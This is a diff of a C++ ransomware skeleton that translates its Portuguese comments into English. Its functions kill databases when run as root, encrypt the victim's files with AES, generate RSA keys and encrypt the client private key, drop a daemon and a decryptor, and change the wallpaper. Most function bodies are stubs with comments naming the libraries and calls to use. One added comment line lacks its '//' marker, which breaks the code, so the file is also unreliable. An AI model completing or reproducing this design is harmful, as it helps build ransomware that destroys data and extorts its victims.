@@ -8,7 +8,7 @@
 #include <sys/types.h>
 #include <sys/wait.h>
 
-// Bibliotecas para criptografia devem ser adicionadas conforme necessário
+// Libs for criptography Should be used as needed
 
 void kill_databases() {
     if (getuid() == 0) {
@@ -22,16 +22,16 @@ void kill_databases() {
     }
 }
 
-// Função de criptografia ainda requer implementação específica para C++
-// Consulte a documentação das bibliotecas de criptografia apropriadas
+// The encryption function still requires a C++-specific implementation.
+Refer to the documentation of the appropriate cryptographic libraries.
 
 void start_encryption(std::vector<std::string> &files) {
-    // Implementação da função de criptografia
-    // Use bibliotecas apropriadas para AES, base64, etc.
+    // Implementation of criptography function
+    // Use appropriated Libs for  AES, base64, etc.
 }
 
 void menu() {
-    // Implementação do menu
+    // Implementation of menu
     try {
         mkdir(variables.test_path.c_str(), 0777);
     } catch (...) {}
@@ -42,31 +42,34 @@ void menu() {
     std::vector<std::string> files;
     // get_files.find_files(variables.home, files);
 
-    // Implementação de geração de chaves assimétricas
-    // Usar bibliotecas apropriadas para RSA e manipulação de chaves
+   // Implementation of asymmetric key generation
+// Use appropriate libraries for RSA and key handling
 
-    // Implementação da encriptação da chave privada do cliente
-    // Use bibliotecas apropriadas para RSA e PKCS1_OAEP
+// Implementation of client private key encryption
+// Use appropriate libraries for RSA and PKCS1_OAEP
 
-    // Implementação de escrever chaves em arquivos
-    // Use std::ofstream para escrever em arquivos
+// Implementation of writing keys to files
+// Use std::ofstream to write to files
 
-    // Limpeza de variáveis e coleta de lixo
-    // Use 'delete', 'nullptr' e 'gc.collect()' correspondentes em C++
+// Variable cleanup and garbage collection
+// Use 'delete', 'nullptr', and the C++ equivalent of 'gc.collect()'
+
 }
 
 void drop_daemon_and_decryptor() {
-    // Implementação de escrever daemon e decryptor em arquivos
-    // Use std::ofstream para escrever em arquivos
+  // Implementation of writing daemon and decryptor to files
+// Use std::ofstream to write to files
 
-    // Implementação de permissões de arquivos e execução de subprocessos
-    // Use 'chmod' e 'system' correspondentes em C++
+// Implementation of file permissions and subprocess execution
+// Use 'chmod' and 'system' equivalents in C++
+
 }
 
 int main() {
     menu();
-    // Implementação de mudar papel de parede
-    // Implementação de chamar drop_daemon_and_decryptor()
+    //// Implementation of changing the wallpaper
+// Implementation of calling drop_daemon_and_decryptor()
+
 
     return 0;
 }
